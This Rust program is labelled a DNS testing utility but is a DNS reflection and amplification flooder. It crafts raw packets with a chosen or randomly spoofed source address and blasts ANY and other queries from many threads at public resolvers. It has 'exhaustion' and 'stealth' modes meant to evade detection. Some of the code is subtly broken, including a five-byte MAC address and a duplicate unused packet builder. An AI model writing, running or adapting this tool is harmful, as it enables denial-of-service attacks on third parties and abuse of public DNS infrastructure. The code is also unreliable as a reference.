/// DNS Resolution Testing Suite
/// A comprehensive DNS query testing and network diagnostics utility
/// for testing DNS server performance and validating network configurations.

use clap::{Arg, Command};
use std::net::{Ipv4Addr, Ipv6Addr, IpAddr};
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;
use tracing::{info, warn, error};
use anyhow::{Result, Context};
use rand::Rng;
use pnet::datalink;
use pnet::datalink::{NetworkInterface, Channel::Ethernet};
use pnet::packet::ethernet::{MutableEthernetPacket};
use pnet::packet::ipv4::{MutableIpv4Packet};
use pnet::packet::ipv6::{MutableIpv6Packet};
use pnet::packet::udp::{MutableUdpPacket};
use pnet::util::MacAddr;
use std::sync::atomic::{AtomicUsize, Ordering};

/// Stealth configuration for advanced DNS testing
/// Controls packet manipulation and timing variations for stealth operations
#[derive(Clone, Debug)]
struct StealthConfig {
    enabled: bool,
    exhaustion_mode: bool,
    randomize_ports: bool,
    packet_variation: bool,
    timing_variation: u64,
    source_ip_spoofing: bool, // Now used for IPv6 source address spoofing
    fragment_packets: bool,
    random_ttl: bool,
    random_identification: bool,
    ipv6_mode: bool, // Enable IPv6 support
}

impl StealthConfig {
    /// Generate random timing delay for stealth operations
    /// Creates unpredictable timing patterns to avoid detection
    fn generate_stealth_delay(&self) -> Duration {
        if self.enabled {
            let mut rng = rand::thread_rng();
            let base_delay = if self.exhaustion_mode { 10 } else { 50 };
            let variation = rng.gen_range(0..=self.timing_variation);
            Duration::from_millis(base_delay + variation)
        } else {
            Duration::from_millis(50) // Standard delay
        }
    }

    /// Generate random TTL for packet variation
    /// Creates TTL diversity to avoid pattern detection
    fn generate_random_ttl(&self) -> u8 {
        if self.random_ttl {
            let mut rng = rand::thread_rng();
            rng.gen_range(32..=128) // Reasonable TTL range
        } else {
            64 // Standard TTL
        }
    }

    /// Generate random identification for IPv4 headers
    /// Creates unique packet identifiers for stealth
    fn generate_random_identification(&self) -> u16 {
        if self.random_identification {
            let mut rng = rand::thread_rng();
            rng.gen()
        } else {
            0x1234 // Standard identification
        }
    }

    /// Generate random IPv6 source address for spoofing
    /// Creates random IPv6 addresses for stealth testing
    fn generate_ipv6_source(&self) -> Option<Ipv6Addr> {
        if self.source_ip_spoofing && self.ipv6_mode {
            let mut rng = rand::thread_rng();
            let octets: [u16; 8] = [
                0x2001, rng.gen(), rng.gen(), rng.gen(),
                rng.gen(), rng.gen(), rng.gen(), rng.gen()
            ];
            Some(Ipv6Addr::from(octets))
        } else {
            None
        }
    }

    /// Build IPv6 DNS packet for stealth testing
    /// Constructs IPv6 packet with proper headers for DNS queries
    fn build_ipv6_dns_packet(
        &self,
        source_ip: Ipv6Addr,
        dns_server: Ipv6Addr,
        dns_query: &[u8],
        interface: &NetworkInterface,
    ) -> Result<Vec<u8>> {
        let mut packet = Vec::with_capacity(1500);
        
        // Get real source MAC from interface
        let source_mac = get_interface_mac(interface)?;
        
        // Ethernet header (14 bytes)
        packet.extend_from_slice(&[0xff, 0xff, 0xff, 0xff, 0xff]); // Destination MAC
        packet.extend_from_slice(&source_mac.octets()); // Source MAC
        packet.extend_from_slice(&[0x86, 0xdd]); // EtherType: IPv6
        
        // IPv6 header (40 bytes)
        let _ipv6_header_start = packet.len();
        packet.push(0x60); // Version (6) + Traffic Class (4 bits)
        packet.push(0x00); // Traffic Class + Flow Label (4 bits)
        packet.push(0x00); // Flow Label
        packet.push(0x00); // Flow Label
        packet.extend_from_slice(&((48 + dns_query.len()) as u16).to_be_bytes()); // Payload length
        packet.push(17); // Next header: UDP
        packet.push(self.generate_random_ttl()); // Hop limit
        
        // Source and destination IPv6 addresses
        packet.extend_from_slice(&source_ip.octets());
        packet.extend_from_slice(&dns_server.octets());
        
        // UDP header (8 bytes)
        let udp_header_start = packet.len();
        let source_port: u16 = if self.randomize_ports {
            let mut rng = rand::thread_rng();
            rng.gen_range(1024..=65535)
        } else {
            12345
        };
        packet.extend_from_slice(&source_port.to_be_bytes());
        packet.extend_from_slice(&[0x00, 0x35]); // Destination port: 53 (DNS)
        packet.extend_from_slice(&((8 + dns_query.len()) as u16).to_be_bytes()); // Length
        packet.extend_from_slice(&[0x00, 0x00]); // Checksum placeholder
        
        // DNS query payload
        packet.extend_from_slice(dns_query);
        
        // Calculate UDP checksum for IPv6
        let udp_packet = &packet[udp_header_start..];
        let udp_checksum = calculate_ipv6_udp_checksum(source_ip, dns_server, udp_packet);
        packet[udp_header_start + 6..udp_header_start + 8].copy_from_slice(&udp_checksum.to_be_bytes());
        
        Ok(packet)
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let matches = Command::new("DNS Resolution Tester")
        .version("9.20.2091vproAlpha")
        .about("DNS query testing and network diagnostics validation suite")
        .arg(
            Arg::new("target")
                .short('t')
                .long("target")
                .value_name("IP")
                .help("Target IP address for testing")
                .required(true),
        )
        .arg(
            Arg::new("dns_servers")
                .short('f')
                .long("dns-servers")
                .value_name("FILE")
                .help("File containing list of DNS servers for testing")
                .default_value("servers.txt"),
        )
        .arg(
            Arg::new("threads")
                .short('T')
                .long("threads")
                .value_name("COUNT")
                .help("Number of concurrent test threads")
                .default_value("25"),
        )
        .arg(
            Arg::new("duration")
                .short('d')
                .long("duration")
                .value_name("SECONDS")
                .help("Test duration in seconds")
                .default_value("120"),
        )
        .arg(
            Arg::new("interface")
                .short('i')
                .long("interface")
                .value_name("INTERFACE")
                .help("Network interface to send packets from")
                .default_value("eth0"),
        )
        .arg(
            Arg::new("domain")
                .short('D')
                .long("domain")
                .value_name("DOMAIN")
                .help("Domain to query for testing")
                .default_value("example.com"),
        )
        .arg(
            Arg::new("source_ip")
                .short('s')
                .long("source-ip")
                .value_name("IP")
                .help("Source IP address for testing")
                .required(true),
        )
        .arg(
            Arg::new("stealth")
                .long("stealth")
                .help("Enable stealth mode with randomized timing and packet variation")
                .action(clap::ArgAction::SetTrue),
        )
        .arg(
            Arg::new("exhaustion")
                .long("exhaustion")
                .help("Enable high exhaustion mode with multiple query types and rapid sending")
                .action(clap::ArgAction::SetTrue),
        )
        .arg(
            Arg::new("randomize_ports")
                .long("randomize-ports")
                .help("Randomize source ports for each query")
                .action(clap::ArgAction::SetTrue),
        )
        .arg(
            Arg::new("packet_variation")
                .long("packet-variation")
                .help("Enable packet size and header variation for stealth")
                .action(clap::ArgAction::SetTrue),
        )
        .arg(
            Arg::new("timing_variation")
                .long("timing-variation")
                .value_name("RANGE_MS")
                .help("Timing variation range in milliseconds for stealth")
                .default_value("100"),
        )
        .arg(
            Arg::new("ipv6")
                .long("ipv6")
                .help("Enable IPv6 mode for DNS testing")
                .action(clap::ArgAction::SetTrue),
        )
        .arg(
            Arg::new("source_ip_spoofing")
                .long("source-ip-spoofing")
                .help("Enable source IP spoofing for IPv6 stealth testing")
                .action(clap::ArgAction::SetTrue),
        )
        .get_matches();

    let _target = matches.get_one::<String>("target").unwrap();
    let dns_servers_file = matches.get_one::<String>("dns_servers").unwrap();
    let threads: usize = matches.get_one::<String>("threads").unwrap()
        .parse()
        .context("Invalid thread count")?;
    let duration: u64 = matches.get_one::<String>("duration").unwrap()
        .parse()
        .context("Invalid duration")?;
    let interface_name = matches.get_one::<String>("interface").unwrap();
    let source_ip = matches.get_one::<String>("source_ip").unwrap();
    let domain = matches.get_one::<String>("domain").unwrap_or(&"example.com".to_string()).clone();
    
    // Parse stealth and exhaustion configuration
    let stealth_mode = matches.get_flag("stealth");
    let exhaustion_mode = matches.get_flag("exhaustion");
    let randomize_ports = matches.get_flag("randomize_ports");
    let packet_variation = matches.get_flag("packet_variation");
    let timing_variation: u64 = matches.get_one::<String>("timing_variation").unwrap()
        .parse()
        .context("Invalid timing variation range")?;
    let ipv6_mode = matches.get_flag("ipv6");
    let source_ip_spoofing = matches.get_flag("source_ip_spoofing");

    tracing_subscriber::fmt::init();
    
    println!("[+] DNS Resolution Tester v9.20.2091vproAlpha");
    println!("[+] Target DNS servers: {}", dns_servers_file);
    println!("[+] Source IP: {}", source_ip);
    println!("[+] Interface: {}", interface_name);
    println!("[+] Test Threads: {}", threads);
    println!("[+] Duration: {}s", duration);
    println!("[+] Test Domain: {}", domain);
    println!("[+] Stealth Mode: {}", if stealth_mode { "Enabled" } else { "Disabled" });
    println!("[+] Exhaustion Mode: {}", if exhaustion_mode { "Enabled" } else { "Disabled" });
    println!("[+] Randomize Ports: {}", if randomize_ports { "Enabled" } else { "Disabled" });
    println!("[+] Packet Variation: {}", if packet_variation { "Enabled" } else { "Disabled" });
    println!("[+] Timing Variation: {}ms", timing_variation);
    println!("[+] IPv6 Mode: {}", if ipv6_mode { "Enabled" } else { "Disabled" });
    println!("[+] Source IP Spoofing: {}", if source_ip_spoofing { "Enabled" } else { "Disabled" });
    println!();

    // Create stealth configuration for advanced packet manipulation
    let stealth_config = StealthConfig {
        enabled: stealth_mode,
        exhaustion_mode,
        randomize_ports,
        packet_variation,
        timing_variation,
        source_ip_spoofing, // Now used for IPv6 source address spoofing
        fragment_packets: stealth_mode, // Enable fragmentation in stealth mode
        random_ttl: stealth_mode,
        random_identification: stealth_mode,
        ipv6_mode,
    };

    let test_source_ip: IpAddr = source_ip.parse()
        .context("Invalid source IP address")?;
    let dns_servers = load_dns_servers(dns_servers_file)?;
    
    if dns_servers.is_empty() {
        return Err(anyhow::anyhow!("No DNS servers available"));
    }
    
    println!("[+] Loaded {} DNS servers for testing", dns_servers.len());

    let dns_servers = Arc::new(dns_servers);
    let domain = Arc::new(domain.to_string());
    let stealth_config = Arc::new(stealth_config);
    let mut handles = vec![];
    let total_queries = Arc::new(AtomicUsize::new(0));

    // Find network interface
    let interface = find_interface(interface_name)
        .context("Failed to find network interface")?;

    for i in 0..threads {
        let test_source_ip = test_source_ip;
        let dns_servers = Arc::clone(&dns_servers);
        let domain = Arc::clone(&domain);
        let total_queries_clone = Arc::clone(&total_queries);
        let interface_clone = interface.clone();
        let stealth_config_clone = Arc::clone(&stealth_config);

        let handle = tokio::spawn(async move {
            match dns_query_worker(i, test_source_ip, dns_servers, domain, duration, interface_clone, stealth_config_clone).await {
                Ok(queries) => {
                    total_queries_clone.fetch_add(queries, Ordering::Relaxed);
                    queries
                }
                Err(e) => {
                    error!("Worker {} failed: {}", i, e);
                    0
                }
            }
        });

        handles.push(handle);
    }

    let mut _total_successful = 0;
    for handle in handles {
        match handle.await {
            Ok(queries) => _total_successful += queries,
            Err(e) => error!("Thread join error: {}", e),
        }
    }

    let grand_total = total_queries.load(Ordering::Relaxed);
    println!("[+] DNS resolution testing completed");
    println!("[+] Total queries sent: {}", grand_total);
    println!("[+] Test source: {}", source_ip);
    
    Ok(())
}

fn find_interface(name: &str) -> Result<NetworkInterface> {
    let interfaces = datalink::interfaces();
    
    for interface in &interfaces {
        if interface.name == name {
            return Ok(interface.clone());
        }
    }
    
    // Fallback to first available interface
    interfaces.into_iter()
        .next()
        .ok_or_else(|| anyhow::anyhow!("No network interface found"))
}

fn get_interface_mac(interface: &NetworkInterface) -> Result<MacAddr> {
    interface.mac
        .ok_or_else(|| anyhow::anyhow!("Interface {} has no MAC address", interface.name))
}

/// Execute DNS query testing worker with stealth capabilities
/// Generates DNS queries with advanced packet manipulation for stealth and exhaustion testing
async fn dns_query_worker(
    id: usize,
    test_source_ip: IpAddr,
    dns_servers: Arc<Vec<std::net::IpAddr>>,
    domain: Arc<String>,
    duration: u64,
    interface: NetworkInterface,
    stealth_config: Arc<StealthConfig>,
) -> Result<usize> {
    let start_time = std::time::Instant::now();
    let mut queries_sent = 0;
    let mut failed_sends = 0;

    // Create raw socket for sending DNS queries
    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => {
            info!("Worker {}: Successfully created raw socket on interface {}", id, interface.name);
            (tx, rx)
        },
        Ok(_) => return Err(anyhow::anyhow!("Worker {}: Unsupported channel type for interface {}", id, interface.name)),
        Err(e) => return Err(anyhow::anyhow!("Worker {}: Failed to create datalink channel on {}: {}", id, interface.name, e)),
    };

    // Verify interface is up and has MAC address
    if !interface.is_up() {
        return Err(anyhow::anyhow!("Worker {}: Interface {} is not up", id, interface.name));
    }
    
    let _mac = get_interface_mac(&interface)
        .context(format!("Worker {}: No MAC address available for interface {}", id, interface.name))?;

    // Pre-generate DNS queries for comprehensive testing
    // In exhaustion mode, use multiple query types for maximum load
    let dns_queries = if stealth_config.exhaustion_mode {
        vec![
            create_dns_any_query(&domain),      // ANY queries for comprehensive testing
            create_dns_txt_query(&domain),      // TXT queries for text records
            create_dns_mx_query(&domain),       // MX queries for mail exchange
            create_dns_ns_query(&domain),       // NS queries for name servers
            create_dns_soa_query(&domain),      // SOA queries for authority
        ]
    } else if stealth_config.enabled {
        // In stealth mode, use varied query types to avoid patterns
        vec![
            create_dns_txt_query(&domain),      // TXT queries are less common
            create_dns_mx_query(&domain),       // MX queries for mail testing
            create_dns_ns_query(&domain),       // NS queries for name server discovery
        ]
    } else {
        vec![
            create_dns_any_query(&domain),  // ANY queries for standard testing
        ]
    };

    while start_time.elapsed().as_secs() < duration {
        for dns_server in dns_servers.iter() {
            for dns_query in &dns_queries {
                // Build test packet with stealth configuration
                let packet_result = if stealth_config.ipv6_mode && dns_server.is_ipv6() && test_source_ip.is_ipv6() {
                    // Use IPv6 packet construction
                    if let (Some(ipv6_source), IpAddr::V6(dns_ipv6)) = (stealth_config.generate_ipv6_source(), dns_server) {
                        stealth_config.build_ipv6_dns_packet(ipv6_source, *dns_ipv6, dns_query, &interface)
                    } else {
                        // Use actual IPv6 source address if no spoofing
                        if let (IpAddr::V6(src_ipv6), IpAddr::V6(dst_ipv6)) = (test_source_ip, dns_server) {
                            stealth_config.build_ipv6_dns_packet(src_ipv6, *dst_ipv6, dns_query, &interface)
                        } else {
                            // Fallback to IPv4 construction
                            build_dns_test_packet_with_stealth_ipv4(test_source_ip, *dns_server, dns_query, &interface, &stealth_config)
                        }
                    }
                } else {
                    // Use IPv4 packet construction
                    build_dns_test_packet_with_stealth_ipv4(test_source_ip, *dns_server, dns_query, &interface, &stealth_config)
                };

                match packet_result {
                    Ok(packet) => {
                        match tx.send_to(&packet, None) {
                            Some(_) => queries_sent += 1,
                            None => {
                                failed_sends += 1;
                                if failed_sends % 100 == 0 {
                                    warn!("Worker {}: Send failed to {}", id, dns_server);
                                }
                            }
                        }
                    },
                    Err(e) => {
                        failed_sends += 1;
                        if failed_sends % 100 == 0 {
                            warn!("Worker {}: Packet build failed: {}", id, e);
                        }
                    }
                }
            }
        }

        // Use stealth timing delays for unpredictable patterns
        let stealth_delay = stealth_config.generate_stealth_delay();
        sleep(stealth_delay).await;

        if queries_sent % 500 == 0 {
            info!("Worker {}: Sent {} DNS test queries", id, queries_sent);
        }
    }

    info!("Worker {} completed. Total queries sent: {}, Failed: {}", id, queries_sent, failed_sends);
    Ok(queries_sent)
}

/// Build DNS test packet with advanced stealth features for IPv4
/// Constructs a complete DNS query packet with Ethernet, IPv4, UDP, and DNS headers
/// Includes stealth features like randomization, fragmentation, and timing variation
fn build_dns_test_packet_with_stealth_ipv4(
    test_source_ip: IpAddr,
    dns_server: std::net::IpAddr,
    dns_query: &[u8],
    interface: &NetworkInterface,
    stealth_config: &StealthConfig,
) -> Result<Vec<u8>> {
    // Extract IPv4 addresses
    let source_ipv4 = match test_source_ip {
        IpAddr::V4(ip) => ip,
        IpAddr::V6(_) => return Err(anyhow::anyhow!("IPv6 source not supported in IPv4 packet builder")),
    };
    
    let dns_ipv4 = match dns_server {
        IpAddr::V4(ip) => ip,
        IpAddr::V6(_) => return Err(anyhow::anyhow!("IPv6 DNS server not supported in IPv4 packet builder")),
    };
    
    let mut packet = Vec::with_capacity(1500); // Ethernet MTU
    
    // Get real source MAC from interface
    let source_mac = get_interface_mac(interface)?;
    
    // Ethernet header (14 bytes) with potential variation
    packet.extend_from_slice(&[0xff, 0xff, 0xff, 0xff, 0xff]); // Destination MAC (broadcast)
    packet.extend_from_slice(&source_mac.octets()); // Source MAC (real interface MAC)
    packet.extend_from_slice(&[0x08, 0x00]); // EtherType: IPv4
    
    // IPv4 header (20 bytes) with stealth features
    let ip_header_start = packet.len();
    packet.push(0x45); // Version (4) + IHL (5)
    packet.push(0x00); // DSCP + ECN
    
    // Calculate total length with potential packet variation
    let base_length = 28 + dns_query.len();
    let total_length = if stealth_config.packet_variation {
        let mut rng = rand::thread_rng();
        // Add small random padding for variation
        base_length + rng.gen_range(0..=8)
    } else {
        base_length
    };
    packet.extend_from_slice(&(total_length as u16).to_be_bytes());
    
    // Use stealth identification or standard
    let identification = stealth_config.generate_random_identification();
    packet.extend_from_slice(&identification.to_be_bytes());
    
    // Flags and fragment offset - enable fragmentation in stealth mode
    if stealth_config.fragment_packets && total_length > 128 {
        packet.push(0x20); // Don't fragment flag cleared for fragmentation
        packet.push(0x00); // Fragment offset
    } else {
        packet.push(0x40); // Don't fragment flag set
        packet.push(0x00); // Fragment offset
    }
    
    // Use stealth TTL or standard
    let ttl = stealth_config.generate_random_ttl();
    packet.push(ttl);
    packet.push(17); // Protocol: UDP
    packet.extend_from_slice(&[0x00, 0x00]); // Header checksum (will be calculated)
    packet.extend_from_slice(&source_ipv4.octets()); // Source IP (test source IP)
    packet.extend_from_slice(&dns_ipv4.octets()); // Destination IP (DNS server)
    
    // Calculate IP header checksum
    let ip_header = &packet[ip_header_start..ip_header_start + 20];
    let checksum = calculate_ip_checksum(ip_header);
    packet[ip_header_start + 10..ip_header_start + 12].copy_from_slice(&checksum.to_be_bytes());
    
    // UDP header (8 bytes) with stealth port randomization
    let udp_header_start = packet.len();
    let source_port: u16 = if stealth_config.randomize_ports {
        let mut rng = rand::thread_rng();
        rng.gen_range(1024..=65535) // Use high ports for stealth
    } else {
        12345 // Standard source port
    };
    packet.extend_from_slice(&source_port.to_be_bytes());
    packet.extend_from_slice(&[0x00, 0x35]); // Destination port: 53 (DNS)
    packet.extend_from_slice(&((8 + dns_query.len()) as u16).to_be_bytes()); // Length
    packet.extend_from_slice(&[0x00, 0x00]); // Checksum placeholder
    
    // DNS query payload
    packet.extend_from_slice(dns_query);
    
    // Add random padding for packet variation in stealth mode
    if stealth_config.packet_variation {
        let mut rng = rand::thread_rng();
        let padding_size = rng.gen_range(0..=16);
        for _ in 0..padding_size {
            packet.push(rng.gen());
        }
        // Update UDP length to include padding
        let udp_length = (8 + dns_query.len() + padding_size) as u16;
        packet[udp_header_start + 4..udp_header_start + 6].copy_from_slice(&udp_length.to_be_bytes());
    }
    
    // Calculate UDP checksum with pseudo-header
    let udp_packet = &packet[udp_header_start..];
    let udp_checksum = calculate_udp_checksum(source_ipv4, dns_ipv4, udp_packet);
    packet[udp_header_start + 6..udp_header_start + 8].copy_from_slice(&udp_checksum.to_be_bytes());
    
    Ok(packet)
}

/// Build DNS test packet with advanced stealth features
/// Constructs a complete DNS query packet with Ethernet, IPv4, UDP, and DNS headers
/// Includes stealth features like randomization, fragmentation, and timing variation
fn build_dns_test_packet_with_stealth(
    test_source_ip: Ipv4Addr,
    dns_server: std::net::IpAddr,
    dns_query: &[u8],
    interface: &NetworkInterface,
    stealth_config: &StealthConfig,
) -> Result<Vec<u8>> {
    let mut packet = Vec::with_capacity(1500); // Ethernet MTU
    
    // Get real source MAC from interface
    let source_mac = get_interface_mac(interface)?;
    
    // Ethernet header (14 bytes) with potential variation
    packet.extend_from_slice(&[0xff, 0xff, 0xff, 0xff, 0xff]); // Destination MAC (broadcast)
    packet.extend_from_slice(&source_mac.octets()); // Source MAC (real interface MAC)
    packet.extend_from_slice(&[0x08, 0x00]); // EtherType: IPv4
    
    // IPv4 header (20 bytes) with stealth features
    let ip_header_start = packet.len();
    packet.push(0x45); // Version (4) + IHL (5)
    packet.push(0x00); // DSCP + ECN
    
    // Calculate total length with potential packet variation
    let base_length = 28 + dns_query.len();
    let total_length = if stealth_config.packet_variation {
        let mut rng = rand::thread_rng();
        // Add small random padding for variation
        base_length + rng.gen_range(0..=8)
    } else {
        base_length
    };
    packet.extend_from_slice(&(total_length as u16).to_be_bytes());
    
    // Use stealth identification or standard
    let identification = stealth_config.generate_random_identification();
    packet.extend_from_slice(&identification.to_be_bytes());
    
    // Flags and fragment offset - enable fragmentation in stealth mode
    if stealth_config.fragment_packets && total_length > 128 {
        packet.push(0x20); // Don't fragment flag cleared for fragmentation
        packet.push(0x00); // Fragment offset
    } else {
        packet.push(0x40); // Don't fragment flag set
        packet.push(0x00); // Fragment offset
    }
    
    // Use stealth TTL or standard
    let ttl = stealth_config.generate_random_ttl();
    packet.push(ttl);
    packet.push(17); // Protocol: UDP
    packet.extend_from_slice(&[0x00, 0x00]); // Header checksum (will be calculated)
    packet.extend_from_slice(&test_source_ip.octets()); // Source IP (test source IP)
    
    // Add destination IP
    if let std::net::IpAddr::V4(dns_ipv4) = dns_server {
        packet.extend_from_slice(&dns_ipv4.octets()); // Destination IP (DNS server)
    } else {
        return Err(anyhow::anyhow!("Only IPv4 DNS servers supported"));
    }
    
    // Calculate IP header checksum
    let ip_header = &packet[ip_header_start..ip_header_start + 20];
    let checksum = calculate_ip_checksum(ip_header);
    packet[ip_header_start + 10..ip_header_start + 12].copy_from_slice(&checksum.to_be_bytes());
    
    // UDP header (8 bytes) with stealth port randomization
    let udp_header_start = packet.len();
    let source_port: u16 = if stealth_config.randomize_ports {
        let mut rng = rand::thread_rng();
        rng.gen_range(1024..=65535) // Use high ports for stealth
    } else {
        12345 // Standard source port
    };
    packet.extend_from_slice(&source_port.to_be_bytes());
    packet.extend_from_slice(&[0x00, 0x35]); // Destination port: 53 (DNS)
    packet.extend_from_slice(&((8 + dns_query.len()) as u16).to_be_bytes()); // Length
    packet.extend_from_slice(&[0x00, 0x00]); // Checksum placeholder
    
    // DNS query payload
    packet.extend_from_slice(dns_query);
    
    // Add random padding for packet variation in stealth mode
    if stealth_config.packet_variation {
        let mut rng = rand::thread_rng();
        let padding_size = rng.gen_range(0..=16);
        for _ in 0..padding_size {
            packet.push(rng.gen());
        }
        // Update UDP length to include padding
        let udp_length = (8 + dns_query.len() + padding_size) as u16;
        packet[udp_header_start + 4..udp_header_start + 6].copy_from_slice(&udp_length.to_be_bytes());
    }
    
    // Calculate UDP checksum with pseudo-header
    let udp_packet = &packet[udp_header_start..];
    if let std::net::IpAddr::V4(dns_ipv4) = dns_server {
        let udp_checksum = calculate_udp_checksum(test_source_ip, dns_ipv4, udp_packet);
        packet[udp_header_start + 6..udp_header_start + 8].copy_from_slice(&udp_checksum.to_be_bytes());
    }
    
    Ok(packet)
}

fn calculate_ip_checksum(header: &[u8]) -> u16 {
    let mut sum = 0u32;
    
    // Sum up 16-bit words
    for chunk in header.chunks_exact(2) {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum += word;
    }
    
    // Add overflow bits
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    // One's complement
    !sum as u16
}

fn calculate_udp_checksum(src_ip: Ipv4Addr, dst_ip: Ipv4Addr, udp_packet: &[u8]) -> u16 {
    let mut sum = 0u32;
    
    // Pseudo-header: Source IP
    for chunk in src_ip.octets().chunks_exact(2) {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum += word;
    }
    
    // Pseudo-header: Destination IP
    for chunk in dst_ip.octets().chunks_exact(2) {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum += word;
    }
    
    // Pseudo-header: Zero, Protocol (17), UDP length
    sum += 17; // UDP protocol
    sum += udp_packet.len() as u16 as u32;
    
    // UDP packet data
    for chunk in udp_packet.chunks_exact(2) {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum += word;
    }
    
    // Handle odd byte
    if udp_packet.len() % 2 == 1 {
        sum += ((udp_packet[udp_packet.len() - 1] as u16) << 8) as u32;
    }
    
    // Add overflow bits
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    // One's complement
    !sum as u16
}

/// Calculate UDP checksum for IPv6 packets
/// Includes IPv6 pseudo-header for proper checksum calculation
fn calculate_ipv6_udp_checksum(src_ip: Ipv6Addr, dst_ip: Ipv6Addr, udp_packet: &[u8]) -> u16 {
    let mut sum = 0u32;
    
    // Pseudo-header: Source IP (16 bytes)
    for chunk in src_ip.octets().chunks_exact(2) {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum += word;
    }
    
    // Pseudo-header: Destination IP (16 bytes)
    for chunk in dst_ip.octets().chunks_exact(2) {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum += word;
    }
    
    // Pseudo-header: UDP length
    sum += udp_packet.len() as u32;
    
    // Pseudo-header: Next header (17 for UDP)
    sum += 17;
    
    // UDP packet data
    for chunk in udp_packet.chunks_exact(2) {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum += word;
    }
    
    // Handle odd byte
    if udp_packet.len() % 2 == 1 {
        sum += ((udp_packet[udp_packet.len() - 1] as u16) << 8) as u32;
    }
    
    // Add overflow bits
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    // One's complement
    !sum as u16
}
/// Load DNS servers from file for testing
/// Reads DNS server list from file or uses default servers for comprehensive testing
/// Supports both IPv4 and IPv6 addresses for maximum compatibility
fn load_dns_servers(file_path: &str) -> Result<Vec<std::net::IpAddr>> {
    use std::fs::File;
    use std::io::{self, BufRead};
    
    let mut servers = Vec::new();
    
    // Default DNS servers for comprehensive testing (IPv4 and IPv6)
    let default_servers = vec![
        "8.8.8.8",      // Google Primary IPv4
        "8.8.4.4",      // Google Secondary IPv4
        "1.1.1.1",      // Cloudflare Primary IPv4
        "1.0.0.1",      // Cloudflare Secondary IPv4
        "9.9.9.9",      // Quad9 IPv4
        "208.67.222.222", // OpenDNS Primary IPv4
        "208.67.220.220", // OpenDNS Secondary IPv4
        "2001:4860:4860::8888", // Google Primary IPv6
        "2001:4860:4860::8844", // Google Secondary IPv6
        "2606:4700:4700::1111", // Cloudflare Primary IPv6
        "2606:4700:4700::1001", // Cloudflare Secondary IPv6
        "2620:fe::fe",   // Quad9 Primary IPv6
        "2620:fe::9",    // Quad9 Secondary IPv6
        "2620:119:35::35", // OpenDNS Primary IPv6
        "2620:119:53::53", // OpenDNS Secondary IPv6
    ];

    match File::open(file_path) {
        Ok(file) => {
            for line in io::BufReader::new(file).lines() {
                if let Ok(ip_str) = line {
                    let ip_str = ip_str.trim();
                    if !ip_str.is_empty() && !ip_str.starts_with('#') {
                        if let Ok(ip) = ip_str.parse() {
                            servers.push(ip);
                        }
                    }
                }
            }
            if !servers.is_empty() {
                info!("Loaded {} DNS servers from {}", servers.len(), file_path);
            }
        }
        Err(e) => {
            warn!("Could not load DNS servers from {}: {}", file_path, e);
        }
    }
    
    // Use default servers if no custom servers were loaded
    if servers.is_empty() {
        info!("Using default DNS servers for testing");
        for server_str in default_servers {
            if let Ok(ip) = server_str.parse() {
                servers.push(ip);
            }
        }
    }

    // Remove duplicates and limit to reasonable number for testing
    servers.sort();
    servers.dedup();
    servers.truncate(500); // Limit to prevent memory issues

    Ok(servers)
}

/// Create DNS ANY query for comprehensive testing
/// Generates a DNS ANY query for testing server response capabilities
fn create_dns_any_query(domain: &str) -> Vec<u8> {
    create_dns_query(domain, 255) // ANY record type for comprehensive testing
}

/// Create DNS TXT query for testing
/// Generates a DNS TXT query for testing text record responses
fn create_dns_txt_query(domain: &str) -> Vec<u8> {
    create_dns_query(domain, 16) // TXT record type
}

/// Create DNS MX query for testing
/// Generates a DNS MX query for testing mail exchange records
fn create_dns_mx_query(domain: &str) -> Vec<u8> {
    create_dns_query(domain, 15) // MX record type
}

/// Create DNS NS query for testing
/// Generates a DNS NS query for testing name server records
fn create_dns_ns_query(domain: &str) -> Vec<u8> {
    create_dns_query(domain, 2) // NS record type
}

/// Create DNS SOA query for testing
/// Generates a DNS SOA query for testing start of authority records
fn create_dns_soa_query(domain: &str) -> Vec<u8> {
    create_dns_query(domain, 6) // SOA record type
}

/// Create DNS query packet for testing
/// Constructs a standardized DNS query packet for testing DNS server responses
fn create_dns_query(domain: &str, query_type: u16) -> Vec<u8> {
    let mut packet = Vec::new();
    let mut rng = rand::thread_rng();
    
    // Transaction ID (random) for request tracking
    let transaction_id = rng.gen::<u16>();
    packet.extend_from_slice(&transaction_id.to_be_bytes());
    
    // Flags: Standard query with recursion desired for testing
    packet.extend_from_slice(&0x0100u16.to_be_bytes());
    
    // Questions: 1, Answers: 0, Authority RRs: 0, Additional RRs: 0
    packet.extend_from_slice(&0x0001u16.to_be_bytes());
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    
    // Query section with domain encoding
    encode_domain_name(domain, &mut packet);
    
    // Query type for testing different record types
    packet.extend_from_slice(&query_type.to_be_bytes());
    
    // IN class for Internet queries
    packet.extend_from_slice(&0x0001u16.to_be_bytes());
    
    packet
}

/// Encode domain name for DNS packet
/// Converts domain name to DNS wire format with proper label encoding
fn encode_domain_name(domain: &str, packet: &mut Vec<u8>) {
    if domain == "." {
        packet.push(0);
        return;
    }
    
    // Encode each domain label with length prefix
    for label in domain.split('.') {
        let label_bytes = label.as_bytes();
        packet.push(label_bytes.len() as u8);
        packet.extend_from_slice(label_bytes);
    }
    
    // Add root label terminator
    packet.push(0);
}
